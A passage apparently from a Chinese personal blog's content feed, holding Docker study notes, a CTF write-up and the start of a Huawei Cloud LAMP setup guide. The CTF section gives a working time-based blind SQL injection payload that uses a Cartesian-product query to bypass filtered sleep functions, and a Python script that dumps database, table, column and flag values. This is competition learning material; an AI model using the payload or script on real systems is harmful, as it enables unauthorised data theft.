class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#命令 docker run -d 镜像名</span><br><span class="line">&gt; docker run -d cnetos</span><br><span class="line">#问题  &gt;  docker ps的时候发现centos停止了</span><br><span class="line">#常见的坑，docker容器使用后台运行的，需要有一个前台进程，而docker发现没有应用，就会自动停止</span><br><span class="line">#比如启动nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有进程了</span><br></pre></td></tr></table></figure><h6 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tail n 容器ID</span><br><span class="line">#显示日志</span><br><span class="line">-tf             #显示日志</span><br><span class="line">--tail number   #要显示的日志条数</span><br></pre></td></tr></table></figure><h6 id="查看容器中的进程信息"><a href="#查看容器中的进程信息" class="headerlink" title="查看容器中的进程信息"></a>查看容器中的进程信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#命令</span><br><span class="line">docker top 容器ID</span><br></pre></td></tr></table></figure><h6 id="查看进程的元数据"><a href="#查看进程的元数据" class="headerlink" title="查看进程的元数据"></a>查看进程的元数据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspact 容器ID</span><br></pre></td></tr></table></figure><h6 id="进入当前正在进行的容器"><a href="#进入当前正在进行的容器" class="headerlink" title="进入当前正在进行的容器"></a>进入当前正在进行的容器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#通常我们容器都是使用后台的方式运行的，有些时候我们需要进入容器，修改一些配置</span><br><span class="line"></span><br><span class="line">#命令</span><br><span class="line">docker exec -it 容器ID bashshell【例如/bin/bash】   #-it就是创建一个可交互的容器</span><br><span class="line">docker  attach 容器ID bashshell   #进去之后就看到正在执行的命令</span><br><span class="line">#二者的区别</span><br><span class="line">docker exec      #进入容器后，开启一个新的终端，可以在里面操作</span><br><span class="line">docker attach    #进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure><h6 id="从容器内拷贝文件到主机上"><a href="#从容器内拷贝文件到主机上" class="headerlink" title="从容器内拷贝文件到主机上"></a>从容器内拷贝文件到主机上</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器ID:路径 目的的主机路径</span><br></pre></td></tr></table></figure><h3 id="Docker镜像详解"><a href="#Docker镜像详解" class="headerlink" title="Docker镜像详解"></a>Docker镜像详解</h3><hr><h6 id="镜像是什么"><a href="#镜像是什么" class="headerlink" title="镜像是什么"></a>镜像是什么</h6><hr><p>镜像是一种轻量级，可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需要的所有内容，包括代码、运行时库、环境变量和配置文件。</p><p>所有的应用，直接打包docker镜像，就可以直接跑起来</p><p>如何得到镜像：</p><ul><li>远程仓库下载</li><li>别人拷贝</li><li>Dockerfile自己制作一个镜像</li></ul><h5 id="Docker镜像加载原理"><a href="#Docker镜像加载原理" class="headerlink" title="Docker镜像加载原理"></a>Docker镜像加载原理</h5><hr><blockquote><p>UnionFS(联合文件系统)</p></blockquote><p>UnionFS(联合文件系统):Union文件系统是一种分层，轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同的目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union文件系统是Docker镜像的基础，镜像可以通过分层来进行继承，基于基础镜像(没有父镜像)，可以制作各种具体的应用镜像</p><p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会吧各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p><h6 id="镜像与容器"><a href="#镜像与容器" class="headerlink" title="镜像与容器"></a>镜像与容器</h6><p>Docker镜像都是只读的，当容器启动之后，一个新的可写层被加载到镜像的顶部</p><p>这一层就是我们通常说的容器层，容器之下的都叫镜像层。我们创建一个镜像，然后run了之后在里面修改配置或者进行其他操作，这些操作都是基于容器层的，这个时候我们要把它发给其他人，需要把容器和镜像一起再重新打包。</p><h5 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器为一个新的副本</span><br><span class="line">docker commit -m=&#x27;提交的描述信息&#x27; -a=&#x27;作者&#x27; 容器ID 目标镜像名:[TAG]</span><br></pre></td></tr></table></figure><h6 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#1.启动一个默认的Tomcat</span><br><span class="line">#2.发现默认的Tomcat是没有webapps引用的，这是镜像的原因，官方默认的webapps下面是没有文件的</span><br><span class="line">#3.于是我们进入容器，自己拷贝进去了基本的文件</span><br><span class="line">#4.将我们操作过的容器通过commit提交为一个新的镜像</span><br><span class="line">#以后就可以直接使用我们修改过的镜像</span><br><span class="line"></span><br><span class="line">docker commit -m=&#x27;add webapps app&#x27; -a=&#x27;psych&#x27; 镜像ID Tomcat01:1.0</span><br></pre></td></tr></table></figure><h3 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h3><hr><h6 id="什么是容器数据卷"><a href="#什么是容器数据卷" class="headerlink" title="什么是容器数据卷"></a>什么是容器数据卷</h6><hr><p>docker理念回顾：将应用和环境打包成一个镜像</p><p>但是如果数据都在容器中，那么我们将容器删除的时候里面的数据也会跟着丢失，所以需求是如何使数据可持久化。所以我们急需一个容器之间可以数据共享的技术，也就是<strong>容器数据卷</strong>的技术</p><p>本质上就是目录的挂载技术，将容器内的目录挂载到Linux主机上</p><p><strong>总结一句话：数据的持久化和同步操作</strong></p><hr><blockquote><p>方式一：直接使用命令<code>-v</code>挂载</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内目录    #和端口映射很类似</span><br></pre></td></tr></table></figure><h6 id="实战操作：MySQL安装配置"><a href="#实战操作：MySQL安装配置" class="headerlink" title="实战操作：MySQL安装配置"></a>实战操作：MySQL安装配置</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#获取镜像</span><br><span class="line">&gt; docker pull mysql:5.7</span><br><span class="line">#运行容器，需要做数据挂载；安装启动mysql，需要配置密码，这是要注意的点</span><br><span class="line">#官方命令：</span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line">#启动我们的：</span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">#解释</span><br><span class="line">-d                    #后台运行</span><br><span class="line">-p                    #端口映射</span><br><span class="line">-v                    #卷挂载</span><br><span class="line">-e                    #环境配置,设置mysql登录密码</span><br><span class="line">--name                #设置容器名</span><br></pre></td></tr></table></figure><h6 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#匿名挂载 </span><br><span class="line">-v 容器路径</span><br><span class="line">docker run -d -p --name nginx -v /etc/nginx nginx        #不指定主机名</span><br><span class="line">#现在我们来查看所有的volume[卷]的情况</span><br><span class="line">docker volume ls</span><br><span class="line">#就会显示很多匿名挂载，也就是我们在-v的时候只写了容器内的路径，没有写容器外的路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#具名挂载</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx nginx</span><br><span class="line">#然后我们再次查看volume的时候就会看到一个juming-nginx的卷，这个就是我们的具名挂载。</span><br><span class="line">#然后我们要查看一个卷到底挂载到哪里了，就是用inspect查看详细数据就可以</span><br><span class="line">&gt; docker volume inspect juming-nginx</span><br></pre></td></tr></table></figure><p>所有docker容器内的卷，没有指定容器外的路径的话，就会默认放在</p><p><code>/var/lib/docker/volumes/xxx/_data</code>这个路径下面。</p><h6 id="挂载分类"><a href="#挂载分类" class="headerlink" title="挂载分类"></a>挂载分类</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-v  容器内路径                     #匿名挂载</span><br><span class="line">-v  卷名:容器内路径                #具名挂载</span><br><span class="line">-v  /宿主机路径:容器内路径          #指定路径挂载</span><br></pre></td></tr></table></figure><hr><blockquote><p>方式二：利用Dockerfile来构建docker镜像</p></blockquote><p>Dockerfile其实就是一个命令脚本,然后通过一个脚本来生成一个镜像，镜像是一层一层的，脚本是一行一行的命令，对应一层一层的镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfile内容编写  -&gt;  指令 参数    </span><br><span class="line">#所有的指令都是大写  </span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME[&quot;volume01&quot;,&quot;volume02&quot;]    # 挂载卷,匿名挂载，通过docker inspect来查看路径</span><br><span class="line"></span><br><span class="line">CMD echo&quot;__end__&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f Dockerfile -t psych-centos:1.0 .</span><br></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><hr><p>dockerfile是用来构建docker镜像的文件！命令参数脚本。</p><p>构建步骤：</p><ul><li>编写一个Dockerfile文件</li><li>docker build 构建成为一个镜像</li><li>docker run 运行镜像</li><li>docker push 发布镜像(DockerHub、阿里云镜像仓库)</li></ul><h5 id="DOckerfile构建过程"><a href="#DOckerfile构建过程" class="headerlink" title="DOckerfile构建过程"></a>DOckerfile构建过程</h5><hr><p><strong>基础知识</strong>：</p><ul><li>每个保留关键字(指令)必须都是大写字母</li><li>执行从上到下顺序执行</li><li><code>#</code>表示注释</li><li>每一个指令都会去创建提交一个新的镜像层</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230724120145007.png"></p><p>Dockerfile是面向开发的，Docker镜像已经逐渐称为企业交付的标准</p><p>Dockerfile：构建文件，定义了一切的步骤，源代码</p><p>DockerImage：通过Dockerfile构建生成的镜像，最终发布和运行的产品</p><p>Docker容器：容器就是镜像运行起来提供服务的</p><h5 id="Dockerfile指令"><a href="#Dockerfile指令" class="headerlink" title="Dockerfile指令"></a>Dockerfile指令</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM             #基础镜像，一切从这里开始构建</span><br><span class="line">MAINTAINER       #镜像是谁写的，姓名＋邮箱</span><br><span class="line">RUN              #镜像构建的时候需要运行的命令</span><br><span class="line">ADD              #步骤：比如：Tomcat镜像，就需要在centos的基础镜像中添加Tomcat压缩包</span><br><span class="line">WORKDIR          #镜像的工作目录</span><br><span class="line">VOLUME           #挂载的目录</span><br><span class="line">EXPOST           #暴露端口</span><br><span class="line">CMD              #指定这个容器启动的时候要运行的命令，之后最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT       #指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD          #当构建一个被继承的Dockerfile，这个时候就会触发ONBUILD。</span><br><span class="line">COPY             #类似ADD，将文件拷贝到镜像中</span><br><span class="line">ENV              #构建的时候设置环境变量</span><br></pre></td></tr></table></figure><h5 id="实战测试1"><a href="#实战测试1" class="headerlink" title="实战测试1"></a>实战测试1</h5><hr><p>Docker HUb中99%的镜像都是从一个基础镜像过来的。<code>FROM scratch</code>，然后设置需要的软件和其他的配置。</p><p>创建一个自己的centos：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfile</span><br><span class="line">FROM cnetos</span><br><span class="line">MAINTAINER psych&lt;1836969156@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD ehco $MYPATH</span><br><span class="line">CMD echo &#x27;---end---&#x27;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /path·· -t mycentos:0.1 .</span><br><span class="line">#docker build -f dockerfile文件路径 -t 镜像名:[tag]</span><br></pre></td></tr></table></figure><p><strong>可以通过<code>docker history 镜像ID</code> 查看镜像构建过程(变更历史)</strong></p><h5 id="实战测试2"><a href="#实战测试2" class="headerlink" title="实战测试2"></a>实战测试2</h5><hr><p>构建Tomcat镜像：</p><ul><li>准备镜像文件：Tomcat压缩包，jdk压缩包</li><li>编写Dockerfile文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfile</span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER psych&lt;1836969156@qq.com&gt;</span><br><span class="line"></span><br><span class="line">COPY readme.txt /usr/local/readme.txt</span><br><span class="line"></span><br><span class="line">ADD jdk-8ull-linux-x86.tar.gz /usr/local              #ADD之后会自动解压</span><br><span class="line">ADD apache-tomcat-9.0.22.tar.gz /usr/local</span><br><span class="line"></span><br><span class="line">RUN uym -y install vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk.8.0_11</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dj.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINE_HOME /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#构建镜像</span><br><span class="line">docker build -t name .</span><br><span class="line">#启动镜像</span><br><span class="line">docker run -d -p 8888:8080 --name psychtomcat -v /home/psych/build/tomcat/test:/usr/local/apache-tomcat-9.0.22/webapps/test 容器name</span><br><span class="line">#进入容器</span><br><span class="line">docker exec -it 容器ID /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h3><hr><h5 id="Docker0"><a href="#Docker0" class="headerlink" title="Docker0"></a>Docker0</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip addr           #查看ip地址</span><br><span class="line">出现三个地址</span><br><span class="line">l0:  127.0.0.1                 #本机回环地址</span><br><span class="line">eth0:  172.17.90.138           #服务器公网地址</span><br><span class="line">docker0:  172.18.0.1/16        #Docker帮我们生成的网卡地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#问题：docker是如何处理网络访问的？</span><br><span class="line"></span><br><span class="line">#我们随便启动一个容器，查看其ip地址，并尝试主机ping一下</span><br><span class="line">docker run -d -P tomcat</span><br><span class="line">docker exec -it tomcat ip addr    #不进入容器，直接执行命令</span><br><span class="line">#发现了两个网卡:</span><br><span class="line">l0:           127.0.0.1/8</span><br><span class="line">eth0@if162:   172.18.0.2/16      #docker分配的。</span><br><span class="line">#主机尝试ping</span><br><span class="line">ping 172.18.0.2       #发现主机可以ping通docker容器内部</span><br></pre></td></tr></table></figure><blockquote><p>原理</p></blockquote><ul><li>我们每启动一个docker容器，docker就会给容器分配一个ip，我们只要安装了docker，就会有一个网卡docker0，桥接模式，使用的技术是veth-pair技术</li><li>启动一个容器，主机ip addr就会多一对网卡。veth-pair就是一对的虚拟设备接口，都是成对出现，一端连着协议，另一端彼此相连</li><li>不同的容器和容器之间也是可以互相ping通的，因为docker0就想一个路由器一样，让各个容器之间能够ping</li><li>docker中所有的网络接口都是虚拟的，虚拟的转发效率高。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2023-web-hellosql-wp</title>
      <link href="/2023/07/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-web-hellosql-wp/"/>
      <url>/2023/07/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-web-hellosql-wp/</url>
      
        <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个题本来超级简单而且自己都已经有思路就是时间盲注了，本来想睡一觉就起床做，结果成功睡到比赛结束。。真的对不起队友啊！！！</p><h4 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h4><p>进入之后注入点很明显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> xxx.xxx.xxx.xxx:xxxx/index.php?id=1</span><br></pre></td></tr></table></figure><p>修改id后面的值，回显一直不变，而且明显没有显示数据的地方，显然只能是盲注或者报错注入。</p><p>SQL注入的题首先拿去fuzz一波，发现没做什么过滤。但是可疑的是sleep()和benchmark()被过滤了，已经在暗示这是时间盲注了。。</p><p>常见的两个函数被过滤，于是考虑使用<strong>笛卡尔积</strong>。</p><p>使用单引号和#进行闭合和注释，写出盲注语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ascii(substr(database(),1,1))&lt;116 and (select sum(0) from information_ schema.columns A, information_ schema.columns B)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> /index.php?id=1%27%20and%20ascii(substr(database(),1,1))&lt;116%%20(select%20sum(0)%20from information_schema.%20A,information_schema.columns%20B)%23</span><br></pre></td></tr></table></figure><p>写出Python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> import time</span><br><span class="line"> import requests</span><br><span class="line"> from datetime import datetime</span><br><span class="line"> ​</span><br><span class="line"> url = &quot;xxx/index.php&quot;</span><br><span class="line"> result = &quot;&quot;</span><br><span class="line"> for i in range(1,100):</span><br><span class="line">     head = 32</span><br><span class="line">     tail = 126</span><br><span class="line">     while head &lt; tail:</span><br><span class="line">         mid = (head + tail) &gt;&gt; 1</span><br><span class="line">         #查数据库 ctf</span><br><span class="line">         param = &#123;</span><br><span class="line">             &quot;id&quot;: f&quot;1&#x27; and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">         &#125;</span><br><span class="line">         #查表</span><br><span class="line">         param = &#123;</span><br><span class="line">             &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">         &#125;</span><br><span class="line">         #查列  Flagg</span><br><span class="line">         param = &#123;</span><br><span class="line">             &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flllag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">         &#125;</span><br><span class="line">         #Flagg 查数据</span><br><span class="line">         param = &#123;</span><br><span class="line">             &quot;id&quot;: f&quot;1&#x27; and ascii(substr((select(group_concat(concat_ws(0x7e,Flagg)))from(ctf.Flllag)),&#123;i&#125;,1))&gt;&#123;mid&#125; and (select sum(0) from information_schema.columns A,information_schema.columns B)#&quot;</span><br><span class="line">         &#125;</span><br><span class="line">         start = int(datetime.now().timestamp() * 1000)</span><br><span class="line">         resp = requests.get(url, params=param)</span><br><span class="line">         # print(resp.text)</span><br><span class="line">         end = int(datetime.now().timestamp() * 1000)</span><br><span class="line">         if end - start &gt; 300:</span><br><span class="line">             head = mid + 1</span><br><span class="line">         else:</span><br><span class="line">             tail = mid</span><br><span class="line">     if head != 32:</span><br><span class="line">         result += chr(head)</span><br><span class="line">     else:</span><br><span class="line">         break</span><br><span class="line">     print(result)</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>SQL注入第一点是寻找注入点，这个题目没有难度</li><li>根据题目环境，锁定注入方法：盲注或者报错或者写webshell，因为几乎可以说是没有回显</li><li>开始fuzz，寻找思路</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客</title>
      <link href="/2023/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>使用华为云</p><h4 id="关于安全组"><a href="#关于安全组" class="headerlink" title="关于安全组"></a>关于安全组</h4><p>安全组是一种<strong>虚拟防火墙</strong>，具备状态检测和包过滤功能，你可以直接将其理解为防火墙。安全组是一个逻辑上的分组，该分组由一个Region内具有相同安全保护需求，并且互相信任的实例组成。每个实例至少属于一个安全组，在创建时需指定，也可创建后修改。 在该实验中，为了使我们的ECS服务能顺利对外提供服务，我们建立安全组并在创建ECS时指定使用该安全组规则。</p><p>参考： <a href="https://blog.csdn.net/qq_38998213/article/details/118526550">https://blog.csdn.net/qq_38998213&#x2F;article&#x2F;details&#x2F;118526550</a></p><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><p>端口分为两种，一种是TCP端口，一种是UDP端口。计算机之间相互通信的时候，分为两种方式：一种是发送信息以后，可以确认信息是否到达，也就是有应答的方式，这种方式大多采用TCP协议；一种是发送以后就不管了，不去确认信息是否到达，这种方式大多采用UDP协议。对应这两种协议的服务提供的端口，也就分为TCP端口和UDP端口。</p><p>端口的分类：</p><ul><li>公认端口(Well-KnownPorts): 0-1023 它们紧密绑定（binding）于一些服务</li><li>动态端口(Dynamic Ports): 1024-65535 不固定分配某种服务,当进程关闭时，就释放所占用端口</li></ul><h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><p>功能和作用：</p><ul><li>设置内网和外网</li><li>控制端口的开放</li><li>控制端口的单独进或者出数据</li><li>ip过滤，控制哪些ip可以访问</li><li>控制访问的频率和时间段</li><li>控制访问者的上传或者下载流量</li></ul><h3 id="ssh登录服务器"><a href="#ssh登录服务器" class="headerlink" title="ssh登录服务器"></a>ssh登录服务器</h3><p>直接在cmd或者xshell中输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ssh root@公网ip      //root指代的是username，一般默认设置为root</span><br></pre></td></tr></table></figure><p>然后输入密码就可以登录</p><h3 id="配置LAMP"><a href="#配置LAMP" class="headerlink" title="配置LAMP"></a>配置LAMP</h3><p>Debian系统没有安装sudo，所以还要先安装一下sudo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> apt-get install sudo</span><br></pre></td></tr></table></figure><p>安装完成之后配置</p><h4 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> sudo apt update</span><br><span class="line"> sudo apt install php libapache2-mod-php php-mysql</span><br></pre></td></tr></table></figure><h4 id="安装apache"><a href="#安装apache" class="headerlink" title="安装apache"></a>安装apache</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> sudo apt update</span><br><span class="line"> sudo apt install apache2</span><br></pre></td></tr></table></figure><p>安装完成之后用如下命令检查是否安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sudo systemctl status apache2</span><br></pre></td></tr></table></figure><p>如果Debian 10上默认ufw开启了防火墙，你需要将HTTP (<code>80</code>) 和 HTTPS (<code>443</code>)端口放开，以便外部能访问apache的web服务。</p><p>可以通过以下命令配置防火墙允许Apache服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 